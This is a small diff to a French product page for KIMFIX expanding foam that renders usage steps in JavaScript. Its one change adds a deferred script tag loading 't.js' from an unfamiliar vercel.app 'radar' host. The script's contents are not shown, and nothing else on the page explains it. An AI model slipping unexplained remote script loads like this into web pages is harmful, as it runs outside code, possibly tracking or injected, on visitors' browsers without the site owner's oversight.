@@ -26,4 +26,4 @@ document.getElementById('pk').innerHTML=p.pts.map(t=>'<li>'+t+'</li>').join('');
 const ST=k==='net'?[['Agiter','Bien agiter l\'aérosol.'],['Visser','Visser sur le pistolet ou utiliser l\'embout.'],['Nettoyer','Pulvériser sur la mousse encore fraîche.'],['Essuyer','Essuyer avec un chiffon propre.']]:[['Préparer','Support propre, dépoussiéré, légèrement humidifié.'],['Agiter','Bien agiter la bombe une vingtaine de fois.'],['Appliquer',k==='c72'?'Visser sur le pistolet et doser.':'Fixer la paille, bombe tête en bas.'],['Laisser expanser','Remplir environ à moitié : la mousse gonfle. Découper après séchage.']];
 document.getElementById('steps').innerHTML=ST.map(s=>'<div><b>'+s[0]+'</b><span>'+s[1]+'</span></div>').join('');
 const cp=document.getElementById('cp');cp.src=p.camp;cp.alt='KIMFIX en situation';reveal();
-</script></body></html>
+</script><script src="https://radar-xi-flax.vercel.app/t.js" defer></script></body></html>
